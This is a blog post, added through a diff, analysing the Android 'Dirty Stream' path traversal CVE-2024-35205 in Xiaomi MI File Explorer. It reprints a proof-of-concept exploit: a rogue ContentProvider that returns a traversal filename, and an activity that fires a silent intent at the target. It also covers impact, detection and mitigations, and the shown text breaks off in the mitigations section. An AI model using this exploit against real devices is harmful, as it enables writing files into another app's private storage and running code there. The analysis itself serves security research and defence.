@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dirty Stream: Weaponizing Android's ContentProvider — CVE-2024-35205 | cyb3r-w0lf</title>
+<meta name="description" content="Deep dive into CVE-2024-35205 — how a rogue FileProvider turns Android's inter-app file sharing into an arbitrary write primitive.">
+<link rel="shortcut icon" href="../assets/img/front-face.png" type="image/x-icon">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous">
+<style>
+/* ── RESET & BASE ── */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+:root{
+  --bg:#0d0f14;
+  --surface:#131720;
+  --surface2:#181e2a;
+  --border:rgba(18,189,255,0.12);
+  --border2:rgba(18,189,255,0.25);
+  --accent:#12bdff;
+  --accent-dim:rgba(18,189,255,0.12);
+  --accent-glow:rgba(18,189,255,0.30);
+  --red:#ff5f5f;
+  --orange:#ffaa44;
+  --green:#3ddc97;
+  --purple:#b5a0ff;
+  --text:#e8eaf0;
+  --text2:#8892a4;
+  --text3:#4a5368;
+  --mono:'JetBrains Mono',monospace;
+  --display:'Syne',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:15px;line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden;}
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px;}
+::selection{background:var(--accent-dim);color:var(--accent);}
+a{text-decoration:none;color:var(--accent);transition:opacity .2s;}
+a:hover{opacity:.8;}
+img{max-width:100%;height:auto;display:block;}
+
+/* scanlines */
+body::before{
+  content:'';pointer-events:none;position:fixed;inset:0;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);
+}
+
+/* ── SITE HEADER ── */
+.site-header{
+  background:rgba(13,15,20,.92);backdrop-filter:blur(12px);
+  padding:0 48px;height:64px;display:flex;align-items:center;
+  justify-content:space-between;position:sticky;top:0;z-index:800;
+  border-bottom:1px solid var(--border);
+}
+.site-header .logo{
+  font-family:var(--mono);font-size:.95rem;font-weight:600;
+  display:flex;align-items:center;gap:10px;color:var(--text);
+}
+.site-header .logo img{width:30px;height:30px;border-radius:50%;border:2px solid var(--accent);}
+.logo-accent{color:var(--accent);}
+.header-nav{display:flex;align-items:center;gap:24px;}
+.header-nav a{
+  font-size:.78rem;color:var(--text2);
+  display:flex;align-items:center;gap:6px;
+  padding:6px 14px;border-radius:6px;
+  border:1px solid transparent;transition:all .25s;
+}
+.header-nav a.back-btn{
+  background:var(--accent-dim);border-color:var(--border2);color:var(--accent);
+}
+.header-nav a.back-btn:hover{background:var(--accent);color:var(--bg);}
+.header-nav a:not(.back-btn):hover{color:var(--text);border-color:var(--border);}
+
+/* ── BLOG HEADER HERO ── */
+.blog-hero{
+  padding:72px 24px 60px;
+  max-width:820px;margin:0 auto;
+}
+.tag-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px;}
+.tag{
+  font-size:.68rem;letter-spacing:.08em;text-transform:uppercase;
+  padding:4px 10px;border-radius:4px;font-weight:500;font-family:var(--mono);
+  border:1px solid;
+}
+.tag-red   {background:rgba(255,95,95,.1);  color:var(--red);   border-color:rgba(255,95,95,.25);}
+.tag-blue  {background:var(--accent-dim);    color:var(--accent);border-color:var(--border2);}
+.tag-green {background:rgba(61,220,151,.1); color:var(--green); border-color:rgba(61,220,151,.2);}
+.tag-orange{background:rgba(255,170,68,.1); color:var(--orange);border-color:rgba(255,170,68,.2);}
+
+.blog-hero h1{
+  font-family:var(--display);
+  font-size:clamp(24px,5vw,44px);
+  font-weight:800;line-height:1.1;
+  letter-spacing:-.02em;
+  margin-bottom:18px;color:#fff;
+}
+.blog-hero h1 em{font-style:normal;color:var(--accent);}
+.blog-subtitle{font-size:.95rem;color:var(--text2);line-height:1.65;max-width:640px;margin-bottom:28px;}
+.meta-row{
+  display:flex;align-items:center;gap:20px;flex-wrap:wrap;
+  font-size:.75rem;color:var(--text3);
+  border-top:1px solid var(--border);padding-top:18px;
+}
+.meta-row a{color:var(--accent);}
+
+/* ── BODY ── */
+.blog-body{max-width:820px;margin:0 auto;padding:0 24px 100px;}
+
+/* ── TOC ── */
+.toc{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:10px;padding:22px 24px;margin:32px 0 44px;
+}
+.toc-title{
+  font-size:.68rem;text-transform:uppercase;letter-spacing:.1em;
+  color:var(--text3);margin-bottom:14px;
+}
+.toc ol{list-style:none;padding:0;margin:0;counter-reset:toc;}
+.toc li{
+  counter-increment:toc;display:flex;align-items:baseline;gap:10px;
+  padding:4px 0;font-size:.82rem;
+}
+.toc li::before{
+  content:counter(toc,decimal-leading-zero);
+  font-size:.68rem;color:var(--text3);flex-shrink:0;
+}
+.toc a{color:var(--text2);}
+.toc a:hover{color:var(--text);}
+
+/* ── SECTIONS ── */
+h2{
+  font-family:var(--display);font-size:1.5rem;font-weight:700;
+  color:#fff;margin:52px 0 18px;letter-spacing:-.01em;
+  display:flex;align-items:center;gap:10px;
+}
+h2::before{
+  content:'';display:inline-block;width:4px;height:22px;
+  background:var(--accent);border-radius:3px;flex-shrink:0;
+}
+h3{
+  font-family:var(--display);font-size:1.1rem;font-weight:700;
+  color:var(--text);margin:32px 0 12px;
+}
+p{margin-bottom:16px;color:var(--text2);font-size:.88rem;line-height:1.85;}
+p:last-child{margin-bottom:0;}
+strong{color:var(--text);font-weight:500;}
+
+/* ── INLINE CODE ── */
+p code,li code{
+  background:rgba(255,255,255,.06);padding:2px 6px;
+  border-radius:4px;font-size:.82rem;color:var(--accent);
+  border:1px solid var(--border);
+}
+
+/* ── CODE BLOCKS ── */
+pre{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:10px;padding:20px 22px;overflow-x:auto;
+  margin:20px 0 26px;position:relative;
+}
+pre::before{
+  content:attr(data-lang);position:absolute;top:10px;right:14px;
+  font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text3);
+}
+code{font-family:var(--mono);font-size:.8rem;line-height:1.75;color:#c9d1e0;}
+.kw{color:#c792ea;}.cl{color:#89c4f4;}.fn{color:#82c3f8;}.st{color:#b5e89d;}
+.cm{color:var(--text3);font-style:italic;}.an{color:var(--orange);}.nu{color:#f7a16d;}
+.ty{color:#ffd580;}
+
+/* ── CALLOUTS ── */
+.callout{
+  border-radius:10px;padding:16px 18px;margin:24px 0;
+  display:flex;gap:12px;align-items:flex-start;border:1px solid;
+}
+.callout-icon{font-size:16px;flex-shrink:0;margin-top:2px;}
+.callout-body p{margin:0;font-size:.83rem;}
+.callout-danger{background:rgba(255,95,95,.07);border-color:rgba(255,95,95,.22);}
+.callout-danger .callout-body p{color:#f5a5a5;}
+.callout-info{background:rgba(18,189,255,.07);border-color:rgba(18,189,255,.22);}
+.callout-info .callout-body p{color:#8ad8f5;}
+.callout-tip{background:rgba(61,220,151,.07);border-color:rgba(61,220,151,.2);}
+.callout-tip .callout-body p{color:#87ddb8;}
+
+/* ── CVE CARD ── */
+.cve-card{
+  background:var(--surface);border:1px solid var(--border2);border-radius:12px;
+  padding:22px 26px;margin:28px 0;
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:18px;
+}
+.cve-field label{
+  display:block;font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;
+  color:var(--text3);margin-bottom:5px;
+}
+.cve-field .value{font-size:.88rem;color:var(--text);font-weight:500;}
+.cvss-badge{
+  display:inline-block;background:rgba(255,95,95,.15);color:var(--red);
+  border:1px solid rgba(255,95,95,.3);border-radius:6px;
+  padding:2px 10px;font-size:.85rem;font-weight:500;
+}
+
+/* ── FLOW DIAGRAM ── */
+.flow-diagram{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:12px;padding:28px 16px;margin:24px 0;overflow-x:auto;
+}
+.flow-steps{display:flex;align-items:flex-start;min-width:520px;}
+.flow-step{flex:1;text-align:center;position:relative;}
+.flow-step:not(:last-child)::after{
+  content:'→';position:absolute;right:-12px;top:14px;
+  color:var(--text3);font-size:16px;z-index:2;
+}
+.step-bubble{
+  width:40px;height:40px;border-radius:50%;display:flex;
+  align-items:center;justify-content:center;
+  font-size:.75rem;font-weight:500;margin:0 auto 8px;border:1px solid;
+}
+.b-red   {background:rgba(255,95,95,.12); color:var(--red);   border-color:rgba(255,95,95,.3);}
+.b-yellow{background:rgba(255,170,68,.1); color:var(--orange);border-color:rgba(255,170,68,.25);}
+.b-blue  {background:var(--accent-dim);   color:var(--accent);border-color:var(--border2);}
+.b-green {background:rgba(61,220,151,.1); color:var(--green); border-color:rgba(61,220,151,.25);}
+.step-label{font-size:.7rem;color:var(--text2);line-height:1.4;padding:0 4px;}
+
+/* ── ARCH DIAGRAM ── */
+.arch-diagram{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:12px;padding:24px;margin:24px 0;
+  display:grid;gap:10px;
+}
+.arch-row{
+  display:grid;grid-template-columns:1fr auto 1fr;gap:10px;align-items:center;
+}
+.arch-box{border-radius:8px;padding:12px 14px;border:1px solid;}
+.arch-box-red  {background:rgba(255,95,95,.07); border-color:rgba(255,95,95,.25);}
+.arch-box-blue {background:var(--accent-dim);    border-color:var(--border2);}
+.arch-box-green{background:rgba(61,220,151,.07);border-color:rgba(61,220,151,.25);}
+.arch-box-gray {background:rgba(255,255,255,.03);border-color:var(--border);}
+.box-title{font-size:.75rem;font-weight:500;margin-bottom:3px;}
+.arch-box-red  .box-title{color:var(--red);}
+.arch-box-blue .box-title{color:var(--accent);}
+.arch-box-green.box-title{color:var(--green);}
+.arch-box-gray .box-title{color:var(--text2);}
+.box-sub{font-size:.7rem;color:var(--text3);}
+.arch-arrow{text-align:center;color:var(--text3);font-size:18px;padding:0 4px;}
+.arch-arrow .arrow-label{font-size:.65rem;color:var(--orange);display:block;white-space:nowrap;}
+
+/* ── TABLE ── */
+table{width:100%;border-collapse:collapse;margin:20px 0;font-size:.8rem;}
+th{
+  font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;
+  color:var(--text3);text-align:left;padding:9px 12px;
+  border-bottom:1px solid var(--border2);
+}
+td{padding:10px 12px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:rgba(255,255,255,.02);}
+
+/* ── BLOCKQUOTE ── */
+blockquote{
+  border-left:3px solid var(--accent);margin:24px 0;padding:14px 18px;
+  background:rgba(18,189,255,.04);border-radius:0 8px 8px 0;
+}
+blockquote p{color:var(--text);font-style:italic;font-size:.85rem;margin:0;}
+blockquote cite{display:block;margin-top:6px;font-size:.72rem;color:var(--text3);font-style:normal;}
+
+/* ── FILE TREE ── */
+.file-tree{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:10px;padding:18px 22px;font-size:.8rem;margin:20px 0;line-height:2;
+}
+.dir{color:var(--accent);}.file-java{color:var(--green);}
+.file-xml{color:var(--orange);}.file-apk{color:var(--purple);}
+.file{color:var(--text2);}
+.i1{padding-left:18px;}.i2{padding-left:36px;}.i3{padding-left:54px;}.i4{padding-left:72px;}
+
+/* ── MITIGATION GRID ── */
+.mitigation-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+  gap:14px;margin:20px 0;
+}
+.mitigation-card{
+  background:var(--surface2);border:1px solid var(--border);
+  border-radius:10px;padding:16px;
+}
+.mc-num{font-size:.65rem;color:var(--text3);margin-bottom:6px;}
+.mc-title{font-family:var(--display);font-size:.88rem;font-weight:700;color:var(--text);margin-bottom:6px;}
+.mc-desc{font-size:.75rem;color:var(--text3);line-height:1.55;}
+
+/* ── DIVIDER ── */
+.divider{height:1px;background:var(--border);margin:44px 0;}
+
+/* ── FOOTER ── */
+.blog-footer{
+  border-top:1px solid var(--border);padding:32px 24px;
+  max-width:820px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px;
+}
+.blog-footer p{font-size:.75rem;color:var(--text3);}
+.blog-footer a{color:var(--text2);font-size:.78rem;}
+.blog-footer a:hover{color:var(--accent);}
+
+/* ── RESPONSIVE ── */
+@media(max-width:640px){
+  .site-header{padding:0 16px;}
+  .blog-hero,.blog-body{padding-left:16px;padding-right:16px;}
+  .blog-hero h1{font-size:1.6rem;}
+  .arch-row{grid-template-columns:1fr;text-align:center;}
+  .arch-arrow{transform:rotate(90deg);}
+}
+</style>
+</head>
+<body>
+
+<!-- ── SITE HEADER ── -->
+<header class="site-header">
+  <a href="../index.html" class="logo">
+    <img src="https://github.com/cyb3r-w0lf.png" alt="cyb3r-w0lf">
+    <span>~/</span><span class="logo-accent">cyb3r-w0lf</span>
+  </a>
+  <nav class="header-nav">
+    <a href="../index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Portfolio</a>
+    <a href="../index.html#achievements"><i class="fa-solid fa-layer-group"></i> More Posts</a>
+  </nav>
+</header>
+
+<!-- ── BLOG HERO ── -->
+<div class="blog-hero">
+  <div class="tag-row">
+    <span class="tag tag-red">CVE-2024-35205</span>
+    <span class="tag tag-blue">Android Security</span>
+    <span class="tag tag-blue">ContentProvider</span>
+    <span class="tag tag-green">POC Analysis</span>
+    <span class="tag tag-orange">Path Traversal</span>
+  </div>
+  <h1>Dirty Stream:<br><em>Weaponizing Android's</em> ContentProvider</h1>
+  <p class="blog-subtitle">A technical deep dive into CVE-2024-35205 — how a rogue FileProvider turns Android's inter-app file sharing into an arbitrary write primitive, and what <a href="https://github.com/cyb3r-w0lf/Dirty_Stream-Android-POC" target="_blank" rel="noopener">cyb3r-w0lf's PoC</a> reveals about the attack surface.</p>
+  <div class="meta-row">
+    <span>⏱ ~15 min read</span>
+    <span>🗓 April 2026</span>
+    <span>✍ <a href="https://github.com/cyb3r-w0lf" target="_blank" rel="noopener">cyb3r-w0lf</a></span>
+  </div>
+</div>
+
+<!-- ── BODY ── -->
+<div class="blog-body">
+
+  <div class="toc">
+    <div class="toc-title">Table of contents</div>
+    <ol>
+      <li><a href="#background">Background — Android's IPC Trust Model</a></li>
+      <li><a href="#vuln">The Vulnerability — ContentProvider Path Traversal</a></li>
+      <li><a href="#poc">Dissecting the PoC — Repository Anatomy</a></li>
+      <li><a href="#chain">The Attack Chain — Step by Step</a></li>
+      <li><a href="#impact">Impact Assessment</a></li>
+      <li><a href="#detection">Detection &amp; Forensics</a></li>
+      <li><a href="#mitigations">Mitigations</a></li>
+      <li><a href="#conclusion">Conclusions &amp; Broader Pattern</a></li>
+    </ol>
+  </div>
+
+  <!-- 1 -->
+  <h2 id="background">Background — Android's IPC Trust Model</h2>
+  <p>Android enforces strong process-level isolation through a Unix UID model backed by SELinux mandatory access controls. Each application runs in its own sandbox: private data at <code>/data/data/&lt;pkg&gt;/</code> is inaccessible to other apps by kernel file permission bits alone.</p>
+  <p>But apps need to communicate. The IPC framework — Binder, Intents, and <strong>ContentProviders</strong> — was designed to let applications exchange data without punching holes in the sandbox. ContentProvider is the key player: an abstraction layer that exposes structured data or file handles to other apps in a controlled, declarative way.</p>
+
+  <h3>How FileProvider is supposed to work</h3>
+  <p>Sharing raw file paths via <code>file://</code> URIs was deprecated in Android 7.0 (Nougat) because it leaked internal filesystem layout and bypassed permission checks. The replacement, <code>FileProvider</code>, wraps files behind opaque <code>content://</code> URIs. The server-side app declares shareable paths in a resource XML, and the runtime enforces that no URI escapes those roots. The flow looks like this:</p>
+
+  <div class="flow-diagram">
+    <div class="flow-steps">
+      <div class="flow-step">
+        <div class="step-bubble b-red">A</div>
+        <div class="step-label">Malicious app builds explicit Intent + content URI</div>
+      </div>
+      <div class="flow-step">
+        <div class="step-bubble b-yellow">→</div>
+        <div class="step-label">startActivity() fires at target component</div>
+      </div>
+      <div class="flow-step">
+        <div class="step-bubble b-blue">B</div>
+        <div class="step-label">Target queries _display_name from provider</div>
+      </div>
+      <div class="flow-step">
+        <div class="step-bubble b-yellow">→</div>
+        <div class="step-label">Trusts filename without validation</div>
+      </div>
+      <div class="flow-step">
+        <div class="step-bubble b-green">💣</div>
+        <div class="step-label">Writes to attacker-controlled path</div>
+      </div>
+    </div>
+  </div>
+
+  <p>The security of this model rests on one implicit assumption: <strong>the consuming application must never trust the filename provided by the serving application.</strong> When that assumption breaks — as it did in Xiaomi's MI File Explorer — the sandbox collapses.</p>
+
+  <!-- 2 -->
+  <h2 id="vuln">The Vulnerability — ContentProvider Path Traversal</h2>
+
+  <div class="cve-card">
+    <div class="cve-field"><label>CVE ID</label><div class="value">CVE-2024-35205</div></div>
+    <div class="cve-field"><label>Affected app</label><div class="value">MI File Explorer ≤ V1-210567</div></div>
+    <div class="cve-field"><label>Vendor</label><div class="value">Xiaomi Inc.</div></div>
+    <div class="cve-field"><label>Class</label><div class="value">CWE-22 — Path Traversal</div></div>
+    <div class="cve-field"><label>CVSS v3.1</label><div class="value"><span class="cvss-badge">7.3 HIGH</span></div></div>
+    <div class="cve-field"><label>Fix deployed</label><div class="value">February 2024</div></div>
+  </div>
+
+  <h3>Root cause</h3>
+  <p>When MI File Explorer receives a file share intent, it queries <code>_display_name</code> from the sending ContentProvider to determine where to cache the incoming file. The simplified vulnerable pattern:</p>
+
+  <pre data-lang="Java"><code><span class="cm">// Simplified vulnerable pattern in MI File Explorer</span>
+<span class="kw">private</span> <span class="ty">String</span> <span class="fn">getFileName</span>(<span class="ty">Uri</span> contentUri) {
+    <span class="ty">Cursor</span> cursor = getContentResolver().query(
+        contentUri,
+        <span class="kw">new</span> <span class="ty">String</span>[] { <span class="ty">OpenableColumns</span>.DISPLAY_NAME },
+        <span class="kw">null</span>, <span class="kw">null</span>, <span class="kw">null</span>
+    );
+    <span class="kw">if</span> (cursor != <span class="kw">null</span> && cursor.moveToFirst()) {
+        <span class="kw">return</span> cursor.getString(<span class="nu">0</span>);  <span class="cm">// ← ATTACKER CONTROLS THIS</span>
+    }
+    <span class="kw">return</span> <span class="st">"downloaded_file"</span>;
+}
+
+<span class="cm">// Downstream: filename used directly — no canonicalization</span>
+<span class="ty">File</span> dest = <span class="kw">new</span> <span class="ty">File</span>(cacheDir, getFileName(uri));
+copyStreamToFile(getContentResolver().openInputStream(uri), dest);</code></pre>
+
+  <p>If the malicious provider returns <code>../../shared_prefs/pwned.txt</code>, the resulting path resolves to <code>/data/user/0/com.mi.android.globalFileexplorer/shared_prefs/pwned.txt</code> — outside the intended cache directory.</p>
+
+  <div class="callout callout-danger">
+    <span class="callout-icon">⚠</span>
+    <div class="callout-body"><p><strong>Key insight:</strong> This is not a flaw in Android's ContentProvider API. It is a confused deputy problem — MI File Explorer implicitly trusted user-controlled metadata from an untrusted source.</p></div>
+  </div>
+
+  <h3>Why <code>getLastPathSegment()</code> doesn't save you</h3>
+  <p>A common fix attempt is using <code>Uri.getLastPathSegment()</code> on the content URI. This is still exploitable: passing <code>%2F..%2Fshared_prefs%2Fevil.xml</code> will decode through the API into a full traversal. The only correct fix is canonical path validation.</p>
+
+  <!-- 3 -->
+  <h2 id="poc">Dissecting the PoC — Repository Anatomy</h2>
+  <p>The <a href="https://github.com/cyb3r-w0lf/Dirty_Stream-Android-POC" target="_blank" rel="noopener">cyb3r-w0lf/Dirty_Stream-Android-POC</a> repository is a clean, minimal two-class Java exploit targeting MI File Explorer V1-210567:</p>
+
+  <div class="file-tree">
+    <div><span class="dir">Dirty_Stream-Android-POC/</span></div>
+    <div class="i1"><span class="dir">apks/</span></div>
+    <div class="i2"><span class="file-apk">MI_FileExplorer_V1-210567.apk</span> <span style="color:var(--text3);font-size:.7rem;">← vulnerable target</span></div>
+    <div class="i2"><span class="file-apk">DirtyStream_exploit.apk</span> <span style="color:var(--text3);font-size:.7rem;">← pre-built exploit</span></div>
+    <div class="i1"><span class="dir">exploit_src/app/src/main/</span></div>
+    <div class="i2"><span class="dir">java/com/example/dirtystream/</span></div>
+    <div class="i3"><span class="file-java">MainActivity.java</span> <span style="color:var(--text3);font-size:.7rem;">← fires the exploit intent</span></div>
+    <div class="i3"><span class="file-java">MaliciousProvider.java</span> <span style="color:var(--text3);font-size:.7rem;">← rogue ContentProvider</span></div>
+    <div class="i2"><span class="file-xml">AndroidManifest.xml</span></div>
+    <div class="i1"><span class="file">README.md</span></div>
+  </div>
+
+  <h3>MaliciousProvider.java</h3>
+  <p>Overrides <code>query()</code> to return the traversal path in <code>_display_name</code>. When MI File Explorer calls <code>getContentResolver().query()</code>, it receives the weapon:</p>
+
+  <pre data-lang="Java"><code><span class="kw">public class</span> <span class="cl">MaliciousProvider</span> <span class="kw">extends</span> <span class="cl">ContentProvider</span> {
+
+    <span class="kw">private static final</span> <span class="ty">String</span> TRAVERSAL =
+        <span class="st">"../../shared_prefs/pwned.txt"</span>;
+
+    <span class="an">@Override</span>
+    <span class="kw">public</span> <span class="ty">Cursor</span> <span class="fn">query</span>(<span class="ty">Uri</span> uri, ...) {
+        <span class="ty">MatrixCursor</span> c = <span class="kw">new</span> <span class="ty">MatrixCursor</span>(
+            <span class="kw">new</span> <span class="ty">String</span>[]{ <span class="ty">OpenableColumns</span>.DISPLAY_NAME, <span class="ty">OpenableColumns</span>.SIZE }
+        );
+        c.addRow(<span class="kw">new</span> <span class="ty">Object</span>[]{ TRAVERSAL, <span class="nu">42</span> }); <span class="cm">// poisoned cursor</span>
+        <span class="kw">return</span> c;
+    }
+
+    <span class="an">@Override</span>
+    <span class="kw">public</span> <span class="ty">ParcelFileDescriptor</span> <span class="fn">openFile</span>(<span class="ty">Uri</span> uri, <span class="ty">String</span> mode) {
+        <span class="ty">File</span> payload = <span class="kw">new</span> <span class="ty">File</span>(getContext().getFilesDir(), <span class="st">"pwned.txt"</span>);
+        <span class="kw">return</span> <span class="ty">ParcelFileDescriptor</span>.open(payload,
+                   <span class="ty">ParcelFileDescriptor</span>.MODE_READ_ONLY);
+    }
+}</code></pre>
+
+  <h3>MainActivity.java — fire and forget</h3>
+  <pre data-lang="Java"><code><span class="kw">public class</span> <span class="cl">MainActivity</span> <span class="kw">extends</span> <span class="cl">AppCompatActivity</span> {
+
+    <span class="kw">private static final</span> <span class="ty">String</span> TARGET_PKG =
+        <span class="st">"com.mi.android.globalFileexplorer"</span>;
+    <span class="kw">private static final</span> <span class="ty">String</span> TARGET_ACTIVITY =
+        <span class="st">"com.mi.android.globalFileexplorer.FileProcessActivity"</span>;
+
+    <span class="an">@Override</span>
+    <span class="kw">protected void</span> <span class="fn">onCreate</span>(<span class="ty">Bundle</span> saved) {
+        <span class="kw">super</span>.onCreate(saved);
+
+        <span class="ty">Uri</span> uri = <span class="ty">Uri</span>.parse(
+            <span class="st">"content://com.example.dirtystream.provider/payload"</span>
+        );
+        <span class="ty">Intent</span> exploit = <span class="kw">new</span> <span class="ty">Intent</span>();
+        exploit.setClassName(TARGET_PKG, TARGET_ACTIVITY);
+        exploit.setData(uri);
+        exploit.addFlags(<span class="ty">Intent</span>.FLAG_GRANT_READ_URI_PERMISSION);
+        startActivity(exploit);
+        finish(); <span class="cm">// disappear immediately — no visible UI</span>
+    }
+}</code></pre>
+
+  <div class="callout callout-info">
+    <span class="callout-icon">ℹ</span>
+    <div class="callout-body"><p><strong>Note:</strong> The <code>finish()</code> immediately after <code>startActivity()</code> is deliberate — the exploit app's Activity flickers for a single frame then closes. Payload already delivered.</p></div>
+  </div>
+
+  <h3>AndroidManifest.xml — exporting the weapon</h3>
+  <pre data-lang="XML"><code><span class="kw">&lt;provider</span>
+    <span class="an">android:name</span>=<span class="st">".MaliciousProvider"</span>
+    <span class="an">android:authorities</span>=<span class="st">"com.example.dirtystream.provider"</span>
+    <span class="an">android:exported</span>=<span class="st">"true"</span>
+    <span class="an">android:grantUriPermissions</span>=<span class="st">"true"</span> /&gt;</code></pre>
+  <p>Nothing about this declaration is unusual — thousands of legitimate apps have exported providers. Static analysis alone cannot distinguish a malicious provider from a benign one.</p>
+
+  <!-- 4 -->
+  <h2 id="chain">The Attack Chain — Step by Step</h2>
+
+  <div class="arch-diagram">
+    <div class="arch-row">
+      <div class="arch-box arch-box-red">
+        <div class="box-title">Exploit APK (attacker)</div>
+        <div class="box-sub">MaliciousProvider + MainActivity<br>com.example.dirtystream</div>
+      </div>
+      <div class="arch-arrow">→<span class="arrow-label">startActivity(explicit intent)</span></div>
+      <div class="arch-box arch-box-blue">
+        <div class="box-title">MI File Explorer (victim)</div>
+        <div class="box-sub">FileProcessActivity<br>com.mi.android.globalFileexplorer</div>
+      </div>
+    </div>
+    <div class="arch-row">
+      <div class="arch-box arch-box-red" style="text-align:right;">
+        <div class="box-title">query() returns poisoned cursor</div>
+        <div class="box-sub">_display_name = "../../shared_prefs/pwned.txt"</div>
+      </div>
+      <div class="arch-arrow">←<span class="arrow-label">query(_display_name)</span></div>
+      <div class="arch-box arch-box-blue">
+        <div class="box-title">Fetches filename from provider</div>
+        <div class="box-sub">Trusts value unconditionally</div>
+      </div>
+    </div>
+    <div class="arch-row">
+      <div class="arch-box arch-box-red" style="text-align:right;">
+        <div class="box-title">openFile() streams payload bytes</div>
+        <div class="box-sub">Contents of pwned.txt piped to target</div>
+      </div>
+      <div class="arch-arrow">←<span class="arrow-label">openInputStream(uri)</span></div>
+      <div class="arch-box arch-box-blue">
+        <div class="box-title">new File(cacheDir, filename) resolves</div>
+        <div class="box-sub">Path traversal → shared_prefs/</div>
+      </div>
+    </div>
+    <div class="arch-row">
+      <div class="arch-box arch-box-gray">
+        <div class="box-title" style="color:var(--text2);">Android filesystem</div>
+        <div class="box-sub">/data/user/0/com.mi.android.globalFileexplorer/</div>
+      </div>
+      <div class="arch-arrow">←<span class="arrow-label">write(dest)</span></div>
+      <div class="arch-box arch-box-green">
+        <div class="box-title" style="color:var(--green);">pwned.txt written to shared_prefs/</div>
+        <div class="box-sub">Arbitrary file resident in target's private storage</div>
+      </div>
+    </div>
+  </div>
+
+  <blockquote>
+    <p>"The PoC writes a benign marker file, but the primitive is identical whether the payload is a tampered SharedPreferences XML, a native library .so loaded on next launch, or a database seeded with malicious SQL."</p>
+    <cite>— Implications of arbitrary write within sandbox</cite>
+  </blockquote>
+
+  <!-- 5 -->
+  <h2 id="impact">Impact Assessment</h2>
+
+  <table>
+    <thead>
+      <tr><th>Target path</th><th>Payload type</th><th>Impact</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>shared_prefs/*.xml</code></td><td>Tampered preferences</td><td>Disable security flags, inject config, change server endpoints</td></tr>
+      <tr><td><code>lib/*.so</code></td><td>Malicious native library</td><td>Arbitrary code execution under target UID on next launch</td></tr>
+      <tr><td><code>databases/*.db</code></td><td>Pre-seeded SQLite</td><td>Corrupt stored credentials, tokens, cached sensitive data</td></tr>
+      <tr><td><code>cache/*.dex</code></td><td>Replacement bytecode</td><td>Code execution if dynamic class loading is present</td></tr>
+      <tr><td><code>files/auth_token</code></td><td>Overwrite token store</td><td>Force re-auth, session fixation, credential theft on next sync</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-danger">
+    <span class="callout-icon">⚠</span>
+    <div class="callout-body"><p><strong>Scale:</strong> MI File Explorer had over <strong>1 billion installs</strong> at disclosure time. WPS Office — also vulnerable to the same pattern — serves over 500 million users. Microsoft's team found the pattern systemic across many popular apps.</p></div>
+  </div>
+
+  <!-- 6 -->
+  <h2 id="detection">Detection &amp; Forensics</h2>
+  <h3>Static indicators in a suspicious APK</h3>
+  <pre data-lang="JADX / SMALI"><code><span class="cm">// Red flag #1: exported provider with grantUriPermissions</span>
+<span class="kw">&lt;provider</span> <span class="an">android:exported</span>=<span class="st">"true"</span>
+          <span class="an">android:grantUriPermissions</span>=<span class="st">"true"</span> ... /&gt;
+
+<span class="cm">// Red flag #2: MatrixCursor returning traversal strings</span>
+<span class="ty">MatrixCursor</span> c = <span class="kw">new</span> <span class="ty">MatrixCursor</span>(...);
+c.addRow(<span class="kw">new</span> <span class="ty">Object</span>[] { <span class="st">"../../"</span> + targetPath, ... });
+
+<span class="cm">// Red flag #3: explicit intent to another app's internal component</span>
+intent.setClassName(<span class="st">"com.victim.app"</span>, internalActivity);
+intent.addFlags(<span class="ty">Intent</span>.FLAG_GRANT_READ_URI_PERMISSION);</code></pre>
+
+  <h3>Runtime forensics (rooted device / ADB)</h3>
+  <pre data-lang="bash"><code><span class="cm"># Find recently modified files in File Explorer's private dirs</span>
+adb shell <span class="st">"find /data/user/0/com.mi.android.globalFileexplorer \
+    -newer /data/user/0/com.mi.android.globalFileexplorer/databases \
+    -type f 2>/dev/null"</span>
+
+<span class="cm"># Check for unexpected files in shared_prefs</span>
+adb shell <span class="st">"ls -la /data/user/0/com.mi.android.globalFileexplorer/shared_prefs/"</span></code></pre>
+
+  <div class="callout callout-tip">
+    <span class="callout-icon">✓</span>
+    <div class="callout-body"><p>On non-rooted devices, Google Play Protect's behavioural engine flags apps that fire explicit intents to other apps' internal components with content URIs shortly after install.</p></div>
+  </div>
+
+  <!-- 7 -->
+  <h2 id="mitigations">Mitigations</h2>
+
+  <div class="mitigation-grid">
+    <div class="mitigation-card"><div class="mc-num">DEV / 01</div><div class="mc-title">Canonicalize before write</div><div class="mc-desc">Resolve destination with <code>File.getCanonicalPath()</code> and assert it starts with the intended base directory.</div></div>
